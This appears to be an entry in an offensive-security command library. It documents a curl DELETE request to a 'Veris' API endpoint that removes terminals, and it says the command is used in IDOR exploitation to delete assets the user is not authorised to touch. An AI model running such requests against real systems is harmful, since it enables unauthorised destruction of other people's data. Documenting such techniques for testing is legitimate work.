---
data: >-
  curl -X DELETE -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type:
  application/json" "https://veris.example.com/api/terminals/ID/delete"
tags:
  - web
  - delete
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.202Z'
id: bef2beee-5a04-4ea4-af29-d008925b372b
verified: false
validated: true
submitted: true
---
# curl-veris-delete

## Command

```bash
curl -X DELETE -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" "https://veris.example.com/api/terminals/ID/delete"
```

## Description

This curl command sends a DELETE request to the Veris API endpoint for removing a terminal or gatekeeper, using an authentication token. Replace YOUR_TOKEN with a valid Bearer token and ID with the target asset ID. Used in IDOR exploitation to delete unauthorized assets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X DELETE` | Specifies the HTTP DELETE method | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Provides JWT or API token for authentication | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload type (if body used) | No |
| `https://veris.example.com/api/terminals/ID/delete` | Endpoint URL with ID parameter | Yes |

## Examples

### Basic Usage

```bash
curl -X DELETE -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." "https://veris.example.com/api/terminals/12345/delete"
```

### Advanced Usage

```bash
curl -X DELETE -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"confirm": true}' "https://veris.example.com/api/terminals/12345/delete" --verbose
```

## Expected Output

Successful response: HTTP 200 OK or 204 No Content, e.g., {"message": "Terminal deleted successfully"}. Failure: 401/403/404 with error details.

## Related

- [[Related Procedure: Exploit IDOR in Veris]]
